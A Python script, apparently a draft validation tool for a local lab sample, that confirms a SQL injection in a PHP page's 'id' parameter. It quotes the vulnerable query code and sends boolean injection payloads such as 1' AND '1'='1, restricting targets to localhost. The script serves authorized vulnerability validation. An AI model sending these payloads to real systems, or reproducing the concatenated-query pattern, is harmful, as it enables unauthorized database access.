#!/usr/bin/env python3
"""Draft (not executed) validation script for parent sample SQLI-001.

Scope: local authorized lab only. The script reads the audited PHP entry
point's GET parameter "id" and compares the business-result region between a
plain numeric baseline and a minimal boolean contrast pair.

Server-side facts used (local line numbers of normalized_samples/SQLI-001.php):
  L6   if(isset($_GET['id']))
  L8   $id=$_GET['id'];
  L14  $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
  L15  $result=mysql_query($sql);
  L16  $row = mysql_fetch_array($result);
  L20  echo 'Your Login name:'. $row['username'];
  L22  echo 'Your Password:' .$row['password'];
  L28  print_r(mysql_error());

Only the injected predicate is varied. No UNION, no table enumeration, no
data export and no write operation is performed.
"""
import argparse
import http.cookiejar
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}
ROW_MARK = "Your Login name:"
PASS_MARK = "Your Password:"
ERR_OPEN = 'color= "#FFFF00">'
ERR_CLOSE = "</font>"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    """Refuse to follow redirects so a login bounce cannot be mistaken for output."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise urllib.error.HTTPError(req.full_url, code,
                                     "redirect refused -> %s" % newurl,
                                     headers, fp)


def build_opener():
    jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar), NoRedirect())


def load_cookie(path):
    """Cookie comes from a local file; it is never printed."""
    if not path:
        return ""
    with open(path, "r", encoding="utf-8") as fh:
        data = json.load(fh)
    if not isinstance(data, dict) or not isinstance(data.get("cookie"), str):
        raise SystemExit("session file must be a JSON object with a 'cookie' string")
    return data["cookie"]


def check_target(base):
    parts = urllib.parse.urlsplit(base)
    if parts.scheme not in ("http", "https"):
        raise SystemExit("base must be http(s), got %r" % parts.scheme)
    if parts.hostname not in ALLOWED_HOSTS:
        raise SystemExit("only local hosts are allowed, got %r" % parts.hostname)
    return parts


def fetch(opener, base, path, param, value, cookie, timeout):
    query = urllib.parse.urlencode({param: value})
    url = base.rstrip("/") + path + ("&" if "?" in path else "?") + query
    req = urllib.request.Request(url, method="GET")
    req.add_header("User-Agent", "sqli-001-draft/1.0 (local lab)")
    if cookie:
        req.add_header("Cookie", cookie)
    try:
        with opener.open(req, timeout=timeout) as resp:
            return {"url": url, "status": resp.getcode(),
                    "body": resp.read().decode("utf-8", "replace")}
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", "replace") if exc.fp else ""
        return {"url": url, "status": exc.code, "body": body}


def parse_region(body):
    """Extract the audited business-result region: L20/L22 row block or L27-L28 error block."""
    region = {"row_found": False, "login": None, "password": None,
              "error_text": None}
    for raw in body.replace("\r", "").split("\n"):
        line = raw.strip()
        if ROW_MARK in line:
            region["row_found"] = True
            region["login"] = line.split(ROW_MARK, 1)[1].strip()
        elif PASS_MARK in line:
            region["row_found"] = True
            region["password"] = line.split(PASS_MARK, 1)[1].strip()
    idx = body.find(ERR_OPEN)
    if idx != -1:
        tail = body[idx + len(ERR_OPEN):]
        end = tail.find(ERR_CLOSE)
        region["error_text"] = (tail if end == -1 else tail[:end]).strip()
    return region


def main(argv=None):
    ap = argparse.ArgumentParser(
        description="SQLI-001 boolean-contrast draft for GET parameter id")
    ap.add_argument("--base", default="http://127.0.0.1:8080")
    ap.add_argument("--path", required=True,
                    help="path of the audited PHP entry point, e.g. /sqli-001/index.php")
    ap.add_argument("--param", default="id")
    ap.add_argument("--session", default=None,
                    help="JSON file {'cookie': '...'} for the tester's own account")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--out", default=None, help="write the JSON report here")
    args = ap.parse_args(argv)

    check_target(args.base)
    cookie = load_cookie(args.session)
    opener = build_opener()

    cases = [
        ("baseline_numeric", "1"),
        ("true_predicate", "1' AND '1'='1"),
        ("false_predicate", "1' AND '1'='2"),
    ]
    observed = {}
    for name, value in cases:
        resp = fetch(opener, args.base, args.path, args.param, value,
                     cookie, args.timeout)
        observed[name] = {"status": resp["status"],
                          "region": parse_region(resp["body"]),
                          "body_len": len(resp["body"])}

    base_r = observed["baseline_numeric"]["region"]
    true_r = observed["true_predicate"]["region"]
    false_r = observed["false_predicate"]["region"]

    checks = {
        "baseline_row_present": bool(base_r["row_found"]),
        "true_predicate_same_row": bool(
            true_r["row_found"]
            and true_r["login"] == base_r["login"]
            and true_r["password"] == base_r["password"]),
        "false_predicate_no_row": not false_r["row_found"],
    }
    report = {
        "sample_id": "SQLI-001",
        "target": {"base": args.base, "path": args.path, "param": args.param},
        "cases": observed,
        "checks": checks,
        "injection_observed": all([checks["baseline_row_present"],
                                   checks["true_predicate_same_row"],
                                   checks["false_predicate_no_row"]]),
    }
    text = json.dumps(report, ensure_ascii=False, indent=2)
    print(text)
    if args.out:
        with open(args.out, "w", encoding="utf-8") as fh:
            fh.write(text + "\n")
    if not checks["baseline_row_present"]:
        print("precondition failed: baseline row absent (missing row, login bounce "
              "or wrong path); do not read this as a safe result", file=sys.stderr)
        return 2
    return 0


if __name__ == "__main__":
    sys.exit(main())
